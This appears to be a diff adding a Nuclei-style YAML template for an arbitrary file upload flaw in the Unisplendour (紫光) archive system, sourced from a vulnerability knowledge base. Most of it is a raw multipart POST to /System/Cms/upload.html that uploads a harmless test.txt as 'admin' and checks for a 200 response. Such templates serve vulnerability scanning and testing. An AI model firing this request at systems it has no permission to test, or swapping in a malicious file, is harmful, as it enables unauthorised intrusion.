@@ -1,0 +1,112 @@
+id: poc-ob6gp9vsvp7gtw64
+info:
+  name: 紫光档案系统任意文件上传
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ob6gp9vsvp7gtw64'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ob6gp9vsvp7gtw64
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /System/Cms/upload.html?token= HTTP/1.1
+
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36
+
+
+    Connection: close
+
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
+
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3enKbCUwg60aGZcr
+
+
+
+
+    ------WebKitFormBoundary3enKbCUwg60aGZcr
+
+
+    Content-Disposition: form-data; name="userID"
+
+
+
+
+    admin
+
+
+    ------WebKitFormBoundary3enKbCUwg60aGZcr
+
+
+    Content-Disposition: form-data; name="fondsid"
+
+
+
+
+    1
+
+
+    ------WebKitFormBoundary3enKbCUwg60aGZcr
+
+
+    Content-Disposition: form-data; name="comid"
+
+
+
+
+    1
+
+
+    ------WebKitFormBoundary3enKbCUwg60aGZcr
+
+
+    Content-Disposition: form-data; name="token"
+
+
+
+
+    1
+
+
+    ------WebKitFormBoundary3enKbCUwg60aGZcr
+
+
+    Content-Disposition: form-data; name="files[]"; filename="test.txt"
+
+
+
+
+    file-upload-test
+
+
+    ------WebKitFormBoundary3enKbCUwg60aGZcr--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    test.txt
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
